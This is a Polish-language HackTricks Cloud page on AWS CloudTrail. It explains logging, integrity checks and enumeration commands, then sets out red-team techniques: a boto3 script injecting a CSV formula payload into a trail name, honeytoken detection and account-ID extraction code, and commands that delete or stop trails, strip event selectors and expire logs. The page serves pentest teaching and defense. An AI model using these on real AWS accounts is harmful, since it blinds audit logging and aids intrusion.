# AWS - CloudTrail Enum

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub**.

</details>

## **CloudTrail**

AWS CloudTrail **rejestruje i monitoruje aktywność w Twoim środowisku AWS**. Rejestruje szczegółowe **dzienniki zdarzeń**, w tym kto co, kiedy i skąd, dla wszystkich interakcji z zasobami AWS. Zapewnia to ślad audytowy zmian i działań, pomagając w analizie bezpieczeństwa, audytach zgodności i śledzeniu zmian zasobów. CloudTrail jest niezbędny do zrozumienia zachowań użytkowników i zasobów, poprawy postaw bezpieczeństwa i zapewnienia zgodności z przepisami.

Każde zdarzenie rejestrowane zawiera:

* Nazwę wywołanej API: `eventName`
* Wywołaną usługę: `eventSource`
* Czas: `eventTime`
* Adres IP: `SourceIPAddress`
* Metodę agenta: `userAgent`. Przykłady:
* Signing.amazonaws.com - Z konsoli zarządzania AWS
* console.amazonaws.com - Użytkownik główny konta
* lambda.amazonaws.com - AWS Lambda
* Parametry żądania: `requestParameters`
* Elementy odpowiedzi: `responseElements`

Zdarzenia są zapisywane w nowym pliku dziennika **około co 5 minut w pliku JSON**, są przechowywane przez CloudTrail, a następnie pliki dziennika są **dostarczane do S3 około 15 minut po**.\
Dzienniki CloudTrail mogą być **agregowane między kontami i regionami**.\
CloudTrail umożliwia użycie **integralności pliku dziennika w celu weryfikacji, czy pliki dziennika pozostały niezmienione** od momentu dostarczenia ich przez CloudTrail. Tworzy skrót SHA-256 dzienników wewnątrz pliku skrótu. Skrót sha-256 nowych dzienników jest tworzony co godzinę.\
Podczas tworzenia ścieżki selektory zdarzeń umożliwiają wskazanie ścieżki do rejestrowania: zdarzenia zarządzania, danych lub wniosków.

Dzienniki są zapisywane w kubełku S3. Domyślnie używane jest szyfrowanie po stronie serwera (SSE-S3), więc AWS odszyfruje zawartość dla osób mających do niej dostęp, ale dla dodatkowego zabezpieczenia można użyć SSE z KMS i własnych kluczy.

Dzienniki są przechowywane w **kubełku S3 o następującym formacie nazwy**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Przy czym BucketName to: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Przykład: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

W każdym folderze każdy dziennik będzie miał **nazwę według tego formatu**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konwencja nazewnictwa plików dziennika

![](<../../../../.gitbook/assets/image (29).png>)

Ponadto, **pliki skrótu (do sprawdzania integralności plików)** będą znajdować się w **tym samym kubełku**:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregowanie dzienników z wielu kont

* Utwórz ścieżkę w koncie AWS, do którego chcesz dostarczyć pliki dziennika
* Zastosuj uprawnienia do docelowego kubełka S3, umożliwiające dostęp międzykontowy dla CloudTrail i zezwól na dostęp dla każdego konta AWS, które potrzebuje dostępu
* Utwórz nową ścieżkę w innych kontach AWS i wybierz utworzony kubełek w kroku 1

Jednak nawet jeśli możesz zapisać wszystkie dzienniki w tym samym kubełku S3, nie możesz agregować dzienników CloudTrail z wielu kont do dzienników CloudWatch Logs należących do jednego konta AWS.

{% hint style="danger" %}
Pamiętaj, że konto może mieć **różne ścieżki** z CloudTrail **włączone**, przechowujące te same (lub różne) dzienniki w różnych kubełkach.
{% endhint %}

### Cloudtrail ze wszystkich kont org do 1

Podczas tworzenia CloudTrail można wskazać, żeby aktywować cloudtrail dla wszystkich kont w organizacji i otrzymać dzienniki do jednego kubełka:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

W ten sposób można łatwo skonfigurować CloudTrail we wszystkich regionach wszystkich kont i skoncentrować dzienniki w 1 koncie (które należy chronić).

### Sprawdzanie plików dziennika

Możesz sprawdzić, czy dzienniki nie zostały zmienione, uruchamiając

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logi do CloudWatch

**CloudTrail może automatycznie wysyłać logi do CloudWatch, dzięki czemu można ustawić alerty, które ostrzegają, gdy wykonywane są podejrzane działania.**\
Należy pamiętać, że w celu umożliwienia CloudTrail wysyłania logów do CloudWatch, musi zostać utworzona **rola**, która umożliwia tę akcję. Jeśli to możliwe, zaleca się użycie domyślnej roli AWS do wykonania tych działań. Rola ta umożliwi CloudTrail:

* CreateLogStream: Pozwala na tworzenie strumieni dzienników CloudWatch Logs
* PutLogEvents: Dostarcza logi CloudTrail do strumienia dzienników CloudWatch Logs

### Historia zdarzeń

Historia zdarzeń CloudTrail pozwala na sprawdzenie w tabeli zapisanych logów:

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** automatycznie **analizuje** zdarzenia zarządzania zapisem z szlaków CloudTrail i **ostrzega** o **nietypowej aktywności**. Na przykład, jeśli wystąpi wzrost zdarzeń `TerminateInstance`, który różni się od ustalonych bazelin, zostanie to uznane za zdarzenie Insight. Te zdarzenia ułatwiają **odnajdywanie i reagowanie na nietypową aktywność API**.

Insights są przechowywane w tym samym kubełku co logi CloudTrail w: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Bezpieczeństwo

| Integralność plików dziennika CloudTrail | <ul><li>Sprawdza, czy logi zostały zmodyfikowane lub usunięte</li><li><p>Używa plików skrótu (tworzy skrót dla każdego pliku)</p><ul><li>Skróty SHA-256</li><li>SHA-256 z RSA do podpisu cyfrowego</li><li>Klucz prywatny należy do Amazon</li></ul></li><li>Tworzenie pliku skrótu trwa 1 godzinę (wykonywane co godzinę)</li></ul> |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Wstrzyknięcie CSV**

Możliwe jest wykonanie wstrzyknięcia CVS w CloudTrail, które wykona dowolny kod, jeśli dzienniki są eksportowane w formacie CSV i otwarte w programie Excel.\
Poniższy kod wygeneruje wpis dziennika z nieprawidłową nazwą Trail zawierającą ładunek:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Aby uzyskać więcej informacji na temat ataków CSV Injections, sprawdź stronę:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Aby uzyskać więcej informacji na temat tej konkretnej techniki, sprawdź [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Ominięcie wykrywania**

### Ominięcie **HoneyTokens**

HoneyTokens są tworzone w celu **wykrywania wycieku poufnych informacji**. W przypadku AWS są to **klucze AWS, których użycie jest monitorowane**, jeśli coś wywoła działanie z tym kluczem, to ktoś musiał go ukraść.

Jednakże, monitorowanie to odbywa się za pośrednictwem **CloudTrail**, a istnieją niektóre **usługi AWS, które nie wysyłają logów do CloudTrail** (znajdź [listę tutaj](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Niektóre z tych usług będą **odpowiadać** błędem zawierającym **ARN roli klucza**, jeśli nieuprawniona osoba (klucz honeytoken) spróbuje uzyskać do niego dostęp.

W ten sposób **atakujący może uzyskać ARN klucza bez wywoływania żadnego logu**. W ARN atakujący może zobaczyć **ID i nazwę konta AWS**, łatwo jest poznać ID i nazwy kont HoneyToken, więc w ten sposób atakujący może zidentyfikować, czy token jest HoneyTokenem.

![](<../../../../.gitbook/assets/image (65).png>)

#### **Wykrywanie HoneyTokens**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) wykrywa, czy klucz należy do [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Jeśli w nazwie roli lub ID konta pojawi się **`canarytokens.org`**, lub w komunikacie błędu pojawi się **`534261010715`**.
* Testując je bardziej niedawno, używają konta **`717712589309`** i wciąż mają ciąg **`canarytokens.com`** w nazwie.
* Jeśli w nazwie roli w komunikacie błędu pojawi się **`SpaceCrab`**
* **SpaceSiren** używa **uuid** do generowania nazw użytkowników: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Jeśli **nazwa wygląda jak losowo generowana**, istnieje duże prawdopodobieństwo, że jest to HoneyToken.

{% hint style="danger" %}
Należy zauważyć, że wszystkie publiczne interfejsy API, które nie tworzą logów CloudTrail, zostały naprawione, więc być może będziesz musiał znaleźć swoje własne...

Lub możesz uzyskać **ID konta** zaszyfrowane wewnątrz **klucza dostępu**, jak [**wyjaśniono tutaj**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i sprawdzić ID konta na liście swoich kont Honeytokens AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Aby uzyskać więcej informacji, sprawdź [**oryginalne badania**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Dostęp do infrastruktury trzeciej strony

Niektóre usługi AWS będą **tworzyć pewną infrastrukturę**, taką jak **bazy danych** lub klastry **Kubernetes** (EKS). Użytkownik **bezpośrednio komunikujący się z tymi usługami** (takimi jak interfejs API Kubernetes) **nie będzie korzystał z interfejsu API AWS**, więc CloudTrail nie będzie w stanie zobaczyć tej komunikacji.

Dlatego użytkownik mający dostęp do EKS, który odkrył adres URL interfejsu API EKS, może lokalnie wygenerować token i **bez wykrycia przez CloudTrail komunikować się bezpośrednio z usługą API**.

Więcej informacji w:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modyfikowanie konfiguracji CloudTrail

#### Usuwanie ścieżek
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zatrzymaj ścieżki

```bash
aws cloudtrail stop-logging --name <trail_name>
```

Zatrzymuje rejestrowanie zdarzeń dla określonej ścieżki.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Wyłączanie logowania wieloregionowego

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Wyłączanie logowania za pomocą selektorów zdarzeń

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

W pierwszym przykładzie podano pojedynczy selektor zdarzeń jako tablicę JSON z jednym obiektem. `"ReadWriteType": "ReadOnly"` wskazuje, że **selektor zdarzeń powinien rejestrować tylko zdarzenia tylko do odczytu** (więc CloudTrail insights **nie będą sprawdzać zdarzeń zapisu** na przykład).

Możesz dostosować selektor zdarzeń do swoich konkretnych wymagań.

#### Usuwanie dzienników za pomocą polityki cyklu życia S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modyfikowanie konfiguracji kubełka

* Usuń kubełek S3
* Zmień politykę kubełka, aby odrzucić wszelkie zapisy z usługi CloudTrail
* Dodaj politykę cyklu życia do kubełka S3 w celu usuwania obiektów
* Wyłącz klucz KMS używany do szyfrowania dzienników CloudTrail

### Ransomware CloudTrail

#### Ransomware S3

Możesz **wygenerować klucz asymetryczny** i sprawić, że **CloudTrail zaszyfruje dane** tym kluczem, a następnie **usunąć klucz prywatny**, aby zawartość CloudTrail nie mogła zostać odzyskana.\
To jest w zasadzie **ransomware S3-KMS** wyjaśniony w:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

To jest najprostszy sposób na przeprowadzenie poprzedniego ataku z różnymi wymaganiami dotyczącymi uprawnień:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Odnośniki**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie.**

</details>
